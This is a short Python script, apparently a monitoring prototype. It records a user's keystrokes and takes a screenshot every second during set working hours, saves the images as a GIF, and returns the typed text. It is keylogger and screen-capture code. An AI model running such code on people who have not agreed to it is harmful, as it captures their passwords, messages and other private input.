import time as tm
import pyautogui as pg
from PIL import Image as img

import keyboard as kb


def listening():

    kb.start_recording()


    START_W, END_W = 8, 22
    is_working_time = lambda h: True if START_W <= h <= END_W else False

    time, timeout = 0, 30
    hour = tm.localtime().tm_hour
    screenshots = list()

    while is_working_time(hour) and time <= timeout:
        screenshots.append(pg.screenshot())

        # save every 10 seconds
        if time > 0 and time % 10 == 0:
            screenshots[0].save("out.gif", save_all=True,
                                append_images=screenshots[1:],
                                duration=500, loop=0)
        tm.sleep(1)
        time += 1

    recorded = kb.stop_recording()
    text = [txt for txt in kb.get_typed_strings(recorded) if txt != ""]

    return {"text": text, "screen": screenshots}


def keyboard():
    return tm.time(), kb.read_event()

def screen():
    return tm.time(), pg.screenshot()

if __name__ == "__main__":
    pass
